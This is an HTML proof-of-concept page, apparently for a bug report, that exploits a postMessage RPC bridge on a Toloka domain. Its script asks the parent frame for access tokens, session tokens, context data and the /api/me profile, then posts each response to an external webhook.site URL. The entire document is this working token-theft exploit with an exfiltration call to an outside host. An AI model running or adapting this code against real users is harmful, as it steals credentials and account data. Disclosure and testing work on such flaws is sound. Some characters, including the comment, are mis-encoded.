<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC - Toloka postMessage Exploit</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>üì° PoC - Exploiting Toloka postMessage</h2>
  <pre id="log">‚è≥ Waiting...</pre>

  <script>
    const logEl = document.getElementById('log');
    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    const webhookURL = 'https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3';

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();
      
      const handler = (e) => {
        if (e.origin !== 'https://tb.toloka.dev') return;
        if (e.data?.id !== id) return;
        if (e.data?.type !== 'rpc') return;

        log(`‚úÖ [${method}] Response:`, e.data.payload);
        window.removeEventListener('message', handler);

        // ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ•ŸÑŸâ Webhook
        fetch(webhookURL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ method, payload: e.data.payload })
        });
      };

      window.addEventListener('message', handler);

      log(`üì§ Sending ${method} with id ${id}`);
      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');
    }

    window.onload = () => {
      ['getAccessToken', 'getToken', 'getContext'].forEach(method => callRPC(method));

      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
